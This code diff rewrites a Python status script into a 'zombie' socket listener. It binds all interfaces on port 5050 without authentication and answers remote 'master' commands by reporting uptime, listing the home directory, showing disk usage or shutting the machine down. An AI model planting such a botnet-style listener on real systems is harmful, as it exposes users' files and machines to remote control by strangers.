@@ -1,20 +1,39 @@
+import socket
 import subprocess
-import sys
 
-cmd = sys.argv[1] if len(sys.argv) > 1 else "status"
 
-if cmd == "status":
-    print("🧟 ZOMBIE ONLINE")
-    print(subprocess.getoutput("uptime -p"))
-    print(subprocess.getoutput("free -h | grep Mem"))
+HOST = "0.0.0.0"
+PORT = 5050
 
-elif cmd == "files":
-    print(subprocess.getoutput("ls ~"))
+server = socket.socket()
+server.bind((HOST, PORT))
+server.listen(1)
 
-elif cmd == "disk":
-    print(subprocess.getoutput("df -h /"))
+print("🧟 ZOMBIE ONLINE - Esperando o Mestre...")
 
-else:
-    print("Comando desconhecido.")
+while True:
+    conn, addr = server.accept()
+
+    comando = conn.recv(1024).decode().strip()
+    print(f"\n📡 Mestre enviou: {comando}")
+
+    if comando == "status":
+        resposta = subprocess.getoutput("uptime -p")
+    elif comando == "files":
+        resposta = subprocess.getoutput("ls ~")
+    elif comando == "disk":
+        resposta = subprocess.getoutput("df -h /")
+    elif comando == "shutdown":
+        resposta = "Desligando Zumbi..."
+        conn.send(resposta.encode())
+        conn.close()
+        subprocess.run("shutdown now", shell=True)
+        continue
+    else:
+        resposta = "Comando desconhecido."
+
+    print(resposta)
+    conn.send(resposta.encode())
+    conn.close()
 
 
